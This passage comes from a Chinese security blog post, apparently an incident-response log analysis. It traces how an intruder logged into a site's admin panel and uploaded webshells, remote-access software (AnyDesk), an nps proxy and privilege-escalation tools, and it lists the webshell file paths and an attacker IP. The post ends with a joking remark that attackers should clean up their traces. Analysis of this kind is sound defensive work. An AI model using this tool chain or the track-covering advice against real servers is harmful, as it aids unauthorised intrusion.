大概梳理清楚了，黑客通过用户名密码登录后台，接着上传文件。这里就是一顿上传文件，执行命令\n　　‍\n　接着后面一直在通过bypasscfGUI.asp​执行命令，后面估计嫌麻烦，上传了大马\n　‍\n　接着又在上传文件操作数据库\n　‍\n　后面终于想起来上传菜刀马了，早上传不就没这么多事情了吗\n　‍\n　‍\n　不知道为啥，后面又上传了其他的马儿。后面一直用newfile.ashx在操作\n　‍\n　2022-05-06 14:56:59后面就没搞了，接着我们看5-07的日志，黑客从2022-05-07 03:57:07开始搞了，\n　‍\n　‍\n　猜测黑客搞不动了，找了其他的朋友来帮忙解决\n　这个估计也是代理ip\n　​​\n　‍\n　又是一顿上传文件\n　‍\n　​\n　​​\n　‍\n　‍\n　看看那个人上传了哪些东西，后面上传了AnyDesk.exe用于远程连接，上传nps用于挂代理，还有提权工具等\n　​​\n　‍\n　‍\n　‍\n　‍\n　‍\n　后面一直是52.56.45.177 ip在操作，大概的时间也是能对得上的。后面把源码脱下来，又是一顿扫描，发现在2022-05-05 17:54:32的时候已经被上传了马儿\n　‍\n　‍\n　继续分析一下52.56.45.177做的操作，大概就是登陆然后上传。\n　‍\n　‍\n总结 　我估计是，他朋友梭哈下来，然后丢给别人练手，他搞不定了，结果那个人又接着搞，然后上来一顿梭哈。\n　后面的那个人是真的菜，光是上传文件就穿了十几个文件，菜是真的菜。\n/xx/xxxxxxx/cmdline.aspx\r/xx/xxxx/bypasscfGUI.asp\r/xx/xxxx/1.asp\r/xx/xxxx/fz1.asp\r/xx/xxxxxx/dama.asp\r/xx/xxxx/nc.aspx\r/xx/xxxxx/database.asp\r/xx/xxxx/MSSQL.asp\r/xx/xxxx/pgod_sqlserver_manager.asp\r/xx/xxxxxxxx/caidao1.asp\rxx/xxxxxxxx/newfile.asp\r/xx/xxxxxxx/newfile.\r 这个故事告诉我们，日站之后记得擦屁股，毕竟日站不规范，情人两行泪。\n","id":62,"section":"posts","summary":"记一次SQL注入引发的日志分析案例 ++++ author = \u0026ldquo;AD钙奶\u0026rdquo; title = \u0026ldquo;记一次SQL注入引发的日志分析案例\u0026rdquo","tags":null,"title":"","uri":"https://ad-calcium.github.io/1/01/%E8%AE%B0%E4%B8%80%E6%AC%A1sql%E6%B3%A8%E5%85%A5%E5%BC%95%E5%8F%91%E7%9A%84%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%A1%88%E4%BE%8B/","year":"0001"}],"tags":[{"title":"Cobalt strike","uri":"https://ad-calcium.github.io/tags/cobalt-strike/"},{"title":"Confluence ","uri":"https://ad-calcium.github.io/tags/confluence/"},{"title":"exchange系列","uri":"https://ad-calcium.github.io/tags/exchange%E7%B3%BB%E5%88%97/"},{"title":"linux提权","uri":"https://ad-calcium.github.io/tags/linux%E6%8F%90%E6%9D%83/"},{"title":"MSSQL","uri":"https://ad-calcium.github.io/tags/mssql/"},{"title":"MSSQL提权","uri":"https://ad-calcium.github.io/tags/mssql%E6%8F%90%E6%9D%83/"},{"title":"mysql提权","uri":"https://ad-calcium.github.io/tags/mysql%E6%8F%90%E6%9D%83/"},{"title":"Spring","uri":"https://ad-calcium.github.io/tags/spring/"},{"title":"web","uri":"https://ad-calcium.github.io/tags/web/"},{"title":"web安全","uri":"https://ad-calcium.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"title":"web渗透","uri":"https://ad-calcium.github.io/tags/web%E6%B8%97%E9%80%8F/"},{"title":"Win10相关","uri":"https://ad-calcium.github.io/tags/win10%E7%9B%B8%E5%85%B3/"},{"title":"zabbix","uri":"https://ad-calcium.github.io/tags/zabbix/"},{"title":"信息收集","uri":"https://ad-calcium.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"title":"内网","uri":"https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/"},{"title":"内网渗透","uri":"https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"title":"内网环境搭建","uri":"https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"title":"凭据窃取","uri":"https://ad-calcium.github.io/tags/%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96/"},{"title":"向日葵","uri":"https://ad-calcium.github.io/tags/%E5%90%91%E6%97%A5%E8%91%B5/"},{"title":"域渗透","uri":"https://ad-calcium.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"title":"安装博客","uri":"https://ad-calcium.github.io/tags/%E5%AE%89%E8%A3%85%E5%8D%9A%E5%AE%A2/"},{"title":"小技巧","uri":"https://ad-calcium.github.io/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/"},{"title":"攻防演练","uri":"https://ad-calcium.github.io/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"},{"title":"未授权","uri":"https://ad-calcium.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/"},{"title":"横向移动","uri":"https://ad-calcium.github.io/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"title":"流量代理","uri":"https://ad-calcium.github.io/tags/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/"},{"title":"漏洞复现","uri":"https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"title":"端口复用","uri":"https://ad-calcium.github.io/tags/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/"},{"title":"编写yaml格式的poc","uri":"https://ad-calcium.github.io/tags/%E7%BC%96%E5%86%99yaml%E6%A0%BC%E5%BC%8F%E7%9A%84poc/"},{"title":"软件安装","uri":"https://ad-calcium.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/"},{"title":"钓鱼","uri":"https://ad-calcium.github.io/tags/%E9%92%93%E9%B1%BC/"}]}